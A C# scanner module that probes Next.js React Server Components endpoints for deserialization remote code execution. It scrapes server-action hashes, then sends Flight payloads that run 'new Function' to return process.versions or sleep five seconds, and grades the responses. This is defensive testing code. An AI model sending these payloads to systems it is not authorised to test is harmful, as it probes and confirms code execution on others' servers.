using System.Diagnostics;
using System.Text.Json;
using System.Text.RegularExpressions;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Next.js React Server Components / Flight action probe for unsafe deserialization indicators.
/// Requires Next.js fingerprinting where possible; avoids bare Flight tokens (<c>$E</c>) as sole high evidence.
/// Inspired by vendor RSC/CVE advisories; also influenced by pentest-ai <c>web.nextjs_rsc_rce</c>.
/// Category: <c>nextjs-rsc-rce</c>. Re-validate signatures when advisories change.
/// </summary>
public sealed class NextJsRscScanProbe
{
    private readonly AutomationContext _ctx;
    private readonly Action<string, string> _log;

    private const double BlindTimeThresholdS = 5.0;

    private static readonly string[] NextJsBodyMarkers =
    [
        "_next/static/chunks/app/",
        "__NEXT_DATA__",
        "self.__next_f.push("
    ];

    private static readonly string[] ActionRoutes =
    [
        "/", "/login", "/dashboard", "/api/auth/signin", "/api/auth/session"
    ];

    private static readonly Regex CriticalBodyPattern =
        new(
            @"(""node""\s*:\s*""v?\d+\.\d+\.\d+""|node-v\d+\.\d+\.\d+|""modules""\s*:\s*""\d+""\s*,\s*""node"")",
            RegexOptions.IgnoreCase | RegexOptions.Compiled);

    private static readonly string[] HighBodyMarkers =
    [
        "node_versions", "process.env"
    ];

    private static readonly string[] MediumBodyMarkers =
    [
        "react-server-dom-webpack", "Flight", "createServerReference", "decodeReply"
    ];

    public NextJsRscScanProbe(AutomationContext context, Action<string, string> log)
    {
        _ctx = context;
        _log = log;
    }

    public sealed class NextJsRscScanOptions
    {
        public int TimeoutMs { get; set; } = 6000;
        public bool IncludeBrowserCookies { get; set; } = true;
        public bool RequireNextJsFingerprint { get; set; } = true;
    }

    public sealed class NextJsRscFinding
    {
        public string Category { get; init; } = "nextjs-rsc-rce";
        public string Severity { get; init; } = "high";
        public string Signal { get; init; } = "";
        public string Url { get; init; } = "";
        public string Variant { get; init; } = "";
        public int Status { get; init; }
        public string Detail { get; init; } = "";
    }

    public sealed class NextJsRscScanResult
    {
        public string Message { get; init; } = "";
        public bool NextJsDetected { get; init; }
        public int ProbesSent { get; init; }
        public int ElapsedMs { get; init; }
        public List<NextJsRscFinding> Findings { get; init; } = [];
        public bool HasFindings => Findings.Count > 0;
    }

    public async Task<NextJsRscScanResult> RunAsync(NextJsRscScanOptions options, CancellationToken ct = default)
    {
        var sw = Stopwatch.StartNew();
        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running nextjs-rsc-scan.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority);
        var rootFetch = await SecurityProbeHttp.FetchAsync(
            _ctx, origin + "/", "GET", null, null, options.TimeoutMs, options.IncludeBrowserCookies, ct);

        var nextJsDetected = FingerprintNextJs(rootFetch);
        if (options.RequireNextJsFingerprint && !nextJsDetected)
        {
            return new NextJsRscScanResult
            {
                Message = "Next.js App Router fingerprint not detected; scan skipped.",
                NextJsDetected = false,
                ElapsedMs = (int)sw.ElapsedMilliseconds
            };
        }

        var hashes = await EnumerateActionHashesAsync(origin, options, ct);
        if (hashes.Count == 0)
            hashes = ["0000000000000000000000000000000000000000"];

        var findings = new List<NextJsRscFinding>();
        var probesSent = 0;
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        _log($"NextJsRscScan: fingerprint={(nextJsDetected ? "yes" : "assumed")}, {hashes.Count} action hash(es)", "#888888");

        foreach (var route in ActionRoutes)
        {
            ct.ThrowIfCancellationRequested();
            var url = origin.TrimEnd('/') + route;

            foreach (var hash in hashes.Take(3))
            {
                foreach (var (variant, payload) in FlightPayloads())
                {
                    var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                    {
                        ["Content-Type"] = "text/plain;charset=UTF-8",
                        ["Next-Action"] = hash
                    };
                    var timed = await SecurityProbeHttp.FetchTimedAsync(
                        _ctx, url, "POST", headers, payload, options.TimeoutMs, options.IncludeBrowserCookies, ct);
                    probesSent++;

                    var classified = Classify(timed.Result.Status, timed.Result.Body, timed.ElapsedSeconds);
                    if (classified == null) continue;

                    var key = $"{url}|{classified.Value.severity}|{variant}";
                    if (!seen.Add(key)) continue;

                    findings.Add(new NextJsRscFinding
                    {
                        Category = "nextjs-rsc-rce",
                        Severity = classified.Value.severity,
                        Signal = variant,
                        Url = url,
                        Variant = variant,
                        Status = timed.Result.Status,
                        Detail = classified.Value.evidence
                    });
                    _log($"  FLAG Next.js RSC {variant}: {url}", "#F44747");
                    break;
                }

                // Sleep / blind probe — compare against a benign baseline POST for delta timing.
                var sleepHeaders = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                {
                    ["Content-Type"] = "text/plain;charset=UTF-8",
                    ["Next-Action"] = hash
                };
                var sleepBaseline = await SecurityProbeHttp.FetchTimedAsync(
                    _ctx, url, "POST", sleepHeaders, SleepBaselinePayload, options.TimeoutMs, options.IncludeBrowserCookies, ct);
                probesSent++;
                var sleepTimed = await SecurityProbeHttp.FetchTimedAsync(
                    _ctx, url, "POST", sleepHeaders, SleepPayload, options.TimeoutMs, options.IncludeBrowserCookies, ct);
                probesSent++;
                var sleepClass = Classify(
                    sleepTimed.Result.Status, sleepTimed.Result.Body, sleepTimed.ElapsedSeconds,
                    sleepBaseline.ElapsedSeconds);
                if (sleepClass != null
                    && sleepTimed.ElapsedSeconds - sleepBaseline.ElapsedSeconds >= BlindTimeThresholdS)
                {
                    var confirmed = await SecurityProbeTimingConfirm.ConfirmDeltaAsync(
                        async ct2 => (await SecurityProbeHttp.FetchTimedAsync(
                            _ctx, url, "POST", sleepHeaders, SleepBaselinePayload, options.TimeoutMs,
                            options.IncludeBrowserCookies, ct2)).ElapsedSeconds,
                        async ct2 => (await SecurityProbeHttp.FetchTimedAsync(
                            _ctx, url, "POST", sleepHeaders, SleepPayload, options.TimeoutMs,
                            options.IncludeBrowserCookies, ct2)).ElapsedSeconds,
                        (baselineS, attackS) => attackS - baselineS >= BlindTimeThresholdS,
                        ct);
                    probesSent += 2;
                    if (confirmed && seen.Add($"{url}|{sleepClass.Value.severity}|flight_sleep"))
                    {
                        findings.Add(new NextJsRscFinding
                        {
                            Category = "nextjs-rsc-rce",
                            Severity = sleepClass.Value.severity,
                            Signal = "flight_sleep",
                            Url = url,
                            Variant = "flight_sleep",
                            Status = sleepTimed.Result.Status,
                            Detail = sleepClass.Value.evidence
                        });
                    }
                }

                if (findings.Any(f => f.Url.Equals(url, StringComparison.OrdinalIgnoreCase)))
                    break;
            }
        }

        return new NextJsRscScanResult
        {
            Message = findings.Count > 0
                ? $"{findings.Count} Next.js RSC finding(s)."
                : nextJsDetected
                    ? "No Next.js RSC indicators detected."
                    : "Scan completed without Next.js fingerprint (RequireNextJsFingerprint=false).",
            NextJsDetected = nextJsDetected,
            ProbesSent = probesSent,
            Findings = findings,
            ElapsedMs = (int)sw.ElapsedMilliseconds
        };
    }

    public static bool LooksLikeNextJs(TechStackResult? stack, string? htmlBody, IReadOnlyDictionary<string, string>? headers)
    {
        if (stack?.Detections.Any(t => t.Name.Contains("Next.js", StringComparison.OrdinalIgnoreCase)) == true)
            return true;
        if (!string.IsNullOrEmpty(htmlBody) && NextJsBodyMarkers.Any(m => htmlBody.Contains(m, StringComparison.Ordinal)))
            return true;
        if (headers != null)
        {
            foreach (var kv in headers)
            {
                if (kv.Key.StartsWith("x-nextjs", StringComparison.OrdinalIgnoreCase)) return true;
                if (kv.Key.Equals("x-powered-by", StringComparison.OrdinalIgnoreCase)
                    && kv.Value.Contains("Next.js", StringComparison.OrdinalIgnoreCase))
                    return true;
            }
        }
        return false;
    }

    private bool FingerprintNextJs(SecurityProbeHttp.FetchResult rootFetch) =>
        LooksLikeNextJs(null, rootFetch.Body, rootFetch.ResponseHeaders);

    private async Task<List<string>> EnumerateActionHashesAsync(
        string origin, NextJsRscScanOptions options, CancellationToken ct)
    {
        var hashes = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var manifestPaths = new[]
        {
            "/_next/static/chunks/app-pages-internals.js",
            "/_next/static/chunks/main-app.js",
            "/_next/static/chunks/webpack.js"
        };

        foreach (var path in manifestPaths)
        {
            ct.ThrowIfCancellationRequested();
            var fetch = await SecurityProbeHttp.FetchAsync(
                _ctx, origin.TrimEnd('/') + path, "GET", null, null, options.TimeoutMs, false, ct);
            foreach (Match m in Regex.Matches(fetch.Body, @"[a-f0-9]{40}", RegexOptions.IgnoreCase))
                hashes.Add(m.Value);
        }

        return hashes.Take(5).ToList();
    }

    private static IEnumerable<(string variant, string payload)> FlightPayloads()
    {
        yield return ("flight_process_versions",
            """[1,"$E1",["process","versions"]]""");
        yield return ("flight_function_canary",
            """[1,"$E5",["new","Function","return process.versions"]]""");
    }

    private const string SleepBaselinePayload = """[1,"$E5",["new","Function","return 1"]]""";
    private const string SleepPayload = """[1,"$E5",["new","Function","return new Promise(r=>setTimeout(r,5000))"]]""";

    internal static (string severity, string evidence)? Classify(
        int status, string body, double elapsedSeconds, double? baselineElapsedSeconds = null)
    {
        if (CriticalBodyPattern.IsMatch(body))
            return ("critical", $"OS/Node shape leak via Flight payload: {CriticalBodyPattern.Match(body).Value}");

        if (baselineElapsedSeconds.HasValue)
        {
            var delta = elapsedSeconds - baselineElapsedSeconds.Value;
            if (delta >= BlindTimeThresholdS)
                return ("high", $"Time-delay RCE indicator: delta={delta:F2}s (attack={elapsedSeconds:F2}s baseline={baselineElapsedSeconds.Value:F2}s)");
        }

        foreach (var marker in HighBodyMarkers)
        {
            if (body.Contains(marker, StringComparison.OrdinalIgnoreCase))
                return ("high", $"Flight payload reflected: {marker}");
        }

        if (status == 500 && MediumBodyMarkers.Any(m => body.Contains(m, StringComparison.OrdinalIgnoreCase)))
            return ("medium", "RSC parser reachable on 500 response.");

        return null;
    }
}
